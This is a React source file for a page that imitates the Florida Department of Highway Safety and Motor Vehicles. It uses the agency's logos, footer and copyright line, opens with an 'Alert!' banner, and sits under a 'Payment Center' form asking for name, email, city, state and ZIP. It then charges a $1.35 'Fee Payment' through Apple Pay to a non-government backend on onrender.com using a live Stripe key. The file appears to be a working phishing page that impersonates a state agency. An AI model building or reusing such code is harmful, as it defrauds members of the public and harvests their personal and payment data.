
import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { loadStripe } from "@stripe/stripe-js";
import "./style.css";

const stripePromise = loadStripe('pk_live_51OF4jYJAl1eXuNk5kVc2ltfM7XgBmwc0uGvlT6MECVWsBmQqhkpZ43GPyYQ58mrq1A59K5UqE6TFbSoE4f9jmy1p00nulOIW6x'
); // Replace with your Stripe key

export default function FLHSMVPage() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    state: "",
    message: "",
  });

  const [showApplePay, setShowApplePay] = useState(false);
  const paymentRequestRef = useRef(null);
  const stripeRef = useRef(null);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  useEffect(() => {
    const initPaymentRequest = async () => {
      const stripe = await stripePromise;
      stripeRef.current = stripe;

      const paymentRequest = stripe.paymentRequest({
        country: "US",
        currency: "usd",
        total: {
          label: "Fee Payment",
          amount: 135, // $1.35
        },
        requestPayerName: true,
        requestPayerEmail: true,
      });

      const result = await paymentRequest.canMakePayment();
      if (result) {
        paymentRequestRef.current = paymentRequest;
        setShowApplePay(true);

        const elements = stripe.elements();
        const prButton = elements.create("paymentRequestButton", {
          paymentRequest,
        });

        prButton.mount("#payment-request-button");

        paymentRequest.on("paymentmethod", async (ev) => {
          try {
            const res = await fetch("https://flhsmv-backend.onrender.com/create-payment-intent", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ ...formData, amount: 135 }),
            });

            const { clientSecret } = await res.json();

            const { error } = await stripe.confirmCardPayment(clientSecret, {
              payment_method: ev.paymentMethod.id,
            });

            if (error) {
              ev.complete("fail");
              alert("Payment failed: " + error.message);
            } else {
              ev.complete("success");
              navigate("/home1");
            }
          } catch (err) {
            console.error("Payment error:", err);
            ev.complete("fail");
          }
        });
      }
    };

    initPaymentRequest();
  }, [formData, navigate]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    alert("Please use the Apple Pay button to complete your payment.");
  };

  return (
    <div>
      <nav className="container" id="orange">Alert!</nav>
      <header className="site-header">
        <div className="top-bar">
          <img src="flhsmv.png" id="flhsmv" alt="FLHSMV logo" />
        </div>
        <nav className="main-nav">
          <div className="menu-toggle">
            <span className="menu-icon">&#9776;</span>
            <strong>Menu</strong>
          </div>
          <ul className="dropdown-menu"></ul>
        </nav>
      </header>

      <section className="email-form">
        <h2>Payment Center</h2>
        <form onSubmit={handleSubmit}>
          <div>Fee Payment: $1.35</div>

          <label htmlFor="name">Full Name</label>
          <input type="text" id="name" name="name" required value={formData.name} onChange={handleChange} />

          <label htmlFor="email">Email</label>
          <input type="email" id="email" name="email" required value={formData.email} onChange={handleChange} />

          <label htmlFor="phone">City</label>
          <input type="text" id="phone" name="phone" value={formData.phone} onChange={handleChange} />

          <label htmlFor="state">State/Province/Region</label>
          <input type="text" id="state" name="state" value={formData.state} onChange={handleChange} />

          <label htmlFor="message">ZIP / Postal Code</label>
          <input type="tel" id="message" name="message" required value={formData.message} onChange={handleChange} />

          <p><strong>Pay with Apple Pay:</strong></p>
          {showApplePay ? (
            <div id="payment-request-button" style={{ margin: "16px 0" }}></div>
          ) : (
            <p>Apple Pay not available on this device/browser.</p>
          )}

          <button type="submit">Submit Without Payment</button>
        </form>
      </section>

      <footer id="footer">
        <div className="overflow">
          <img src="flhsmv2.png" id="flhsmv2" alt="FLHSMV Secondary Logo" />
          <ul id="footer-navigation" className="list-unstyled">
            <li><a href="/privacy-statement/"><span>Privacy Statement</span></a></li>
            <li><a href="/email-notice/"><span>Email Notice</span></a></li>
            <li className="active"><a href="/disclaimer/"><span>Disclaimer</span></a></li>
            <li className="myflorida">
              <a target="_blank" rel="noopener noreferrer" href="http://www.myflorida.com">
                <span>MyFlorida.com</span>
              </a>
            </li>
            <li><a href="/ada-notice/"><span>ADA Notice</span></a></li>
            <li>
              <a href="https://www.flhsmv.gov/contact-us/?utm_source=internal&utm_medium=none&utm_campaign=Footer&utm_content=contactus">
                <span>Contact Us</span>
              </a>
            </li>
          </ul>
          <p className="copy">
            © Copyright 2014 – 2025 Florida Department of Highway Safety and
            Motor Vehicles. All Rights Reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
